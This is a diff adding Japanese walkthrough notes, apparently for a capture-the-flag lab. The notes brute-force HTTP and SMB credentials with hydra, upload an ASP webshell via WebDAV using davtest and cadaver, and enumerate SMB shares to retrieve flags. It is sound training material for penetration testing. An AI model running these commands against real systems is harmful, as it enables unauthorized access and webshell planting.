@@ -1,0 +1,33 @@
+ユーザー「bob」は強力なパスワードを選択しなかった可能性がある
+1) nmapでセキュリティホールの探索を行う
+2) ブラウザでポート80のサービスを検索する
+3) hydraを使って、ブルートフォース攻撃を行ったパスコードを割り出す
+hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ターゲットドメイン http-get
+4) dirb http://ターゲットドメイン -u ユーザーネーム:パスコード
+5) その後、http://ターゲットドメイン/webdavをブラウザで検索する
+
+重要なファイルはCドライブにあることが多いので、徹底的に調べる
+1) davtest -auth ユーザー名:パスコード -url http://ターゲットドメインを使って、webdavにアップロードできるファイル拡張子を列挙する
+2) cadaver http://ドメイン名/webdavでファイルをアップロードできるようにする
+3) その後、put /usr/share/webshells/asp/webshell.aspでファイルをアップロードする
+4) ブラウザで、http://ターゲットドメイン/webdav/webshell.aspを検索する
+5) サイトの検索ボックスで、flag2.txtと検索
+
+このフラグの取得は、metasploitモジュールのwindows/iis/iis_upload_webdav_upload_aspを使う
+
+SMBユーザーのクレデンシャルを推測することで、次のフラグにつながる重要な情報を明らかになる
+1) nmapでセキュリティホールの探索を行う
+2) その後、enum4linux -a ターゲットドメインで情報を収集する
+3) hydraでブルートフォースを行って、ユーザー名とパスコードを取得する
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://ターゲットドメイン
+4) ブルートフォースが成功したら、以下のコマンドを使って、smb共有に接続する
+smbclient -L //ターゲットドメイン -U ユーザー名
+5) 新しいターミナルを開いて、crackmapexecで共有の権限を確認する
+crackmapexec smb  ターゲットドメイン -u ユーザー名 -p パスコード --shares
+6) 読み取りと書取りの共有を指定して、smb共有を開く
+smbclient //ターゲットドメイン/共有 -U ユーザー名
+7) ログオン後、dirでディレクトリを確認後、getでフラグを取得する
+
+デスクトップディレクトリに探しているものがあるかもしれない
+1) smbにログオンしたまま、cd でUsers\Administrator\Desktop\で移動する
+2) dirでディレクトリを確認する
